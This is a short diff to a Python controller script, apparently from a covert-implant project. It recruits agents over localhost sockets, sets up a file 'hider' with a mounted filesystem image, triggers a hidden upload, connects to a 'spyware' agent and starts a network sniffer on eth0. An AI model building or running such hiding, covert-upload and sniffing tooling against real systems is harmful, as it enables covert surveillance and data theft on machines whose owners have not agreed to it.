@@ -8,6 +8,8 @@ from contParams import *
 from structParams import *
 from agentRecruiter import AgentRecruiter
 import threading
+import configparser
+
 
 HOST = "localhost"
 PORT_MANEGER = 65432
@@ -15,6 +17,11 @@ PORT_SPYWARE = 65410
 
 
 def main():
+    targetHiderPath = "./sentHider.o"
+
+    image_path = "fs.iso"
+    mount_path = "fs"
+
     agents = list()
     recrutionEvent = threading.Event()
     recruiter = AgentRecruiter(HOST, PORT_MANEGER, agents, recrutionEvent)
@@ -24,7 +31,6 @@ def main():
         sleep(1)
 
     agent: Agent = agents.pop()
-    targetHiderPath = "./sentHider.o"
 
     print(
         agent.write_file(
@@ -33,7 +39,7 @@ def main():
         )
     )
 
-    print(agent.hider_setup(targetHiderPath))
+    print(agent.hider_setup(targetHiderPath, image_path, mount_path))
 
     print(
         agent.hidden_action_with_upload(
@@ -45,7 +51,7 @@ def main():
 
     spyAgent = Agent.listenSpyware((HOST, PORT_SPYWARE))
 
-    print(spyAgent.hider_setup(targetHiderPath))
+    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
 
     params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     print(spyAgent.runContraption(params, 10))
